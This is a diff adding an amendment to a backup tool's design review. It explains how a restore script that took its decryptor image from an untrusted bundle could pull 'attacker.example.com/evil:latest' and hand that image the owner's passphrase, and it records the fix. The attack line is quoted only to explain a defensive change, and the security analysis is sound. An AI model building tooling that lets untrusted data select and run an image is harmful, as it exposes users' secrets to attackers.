@@ -229,3 +229,40 @@ authorship is wrong. This is the known hazard of two workers sharing one git
 index, and the rule I gave the implementers — stage only your own paths —
 applies to me at least as strongly, because I am the one who commits while
 others are mid-edit.
+
+
+## Verdict amendment, 2026-09-21: §7.3's image must not come from the bundle
+
+**The verdict was wrong and the implementer proved it.** §7.3 has `restore.sh`
+read the decryptor image out of the bundle's cleartext `meta.json`. Measured
+with a recording docker stub, that means a hostile bundle can make the restore
+script `docker pull attacker.example.com/evil:latest` and then hand it the
+owner's passphrase on stdin.
+
+§5.4's own rule already forbids this: *nothing that survives a failed decrypt
+is decided by `meta.json`*. An image that has already been pulled, run, and fed
+the passphrase **has survived the decrypt completely** — it never needed the
+decrypt to succeed. §2's rejection 5 does not save it either: a wrong
+passphrase choice costs nothing and is caught, while a wrong image choice has
+already happened by the time anything is checked.
+
+**Amended:** the decryptor images are **constants in `restore.sh`**, overridable
+only by `NOVA_CRYPTO_IMAGE` / `NOVA_FALLBACK_IMAGE` that the operator types. A
+test asserts mechanically that no `meta.json` reader remains in that path.
+`meta.json` is left with exactly one consumer, the advisory fingerprint.
+
+**The class, stated once so the next reader sees it:** this was the **third**
+instance in one file of *an unauthenticated value steering an action* — the
+`restore_to` path escape was the first, `verify_extracted` joining
+`members[].path` the second. A bundle is a file that can come from anywhere;
+nothing inside it may select the code that opens it, or where that code writes.
+
+### Consequence for other tasks
+
+- **C3 changes the listing format.** A fifth line kind, `L ./path -> target`,
+  one per symlink, in the same sorted file — because a **retargeted** symlink
+  was invisible to both verifiers, so the backup could not notice its own data
+  being repointed. T3 adds one pass (`find . -type l -printf "L %p -> %l\n"`);
+  a listing naming an `l` entry with no `L` line is a **refusal**, not a skip.
+- **Carried-script digests moved again**: `nova_restore.py` `bead35a6…`,
+  `restore.sh` `894fead8…`. T6 publishes these.
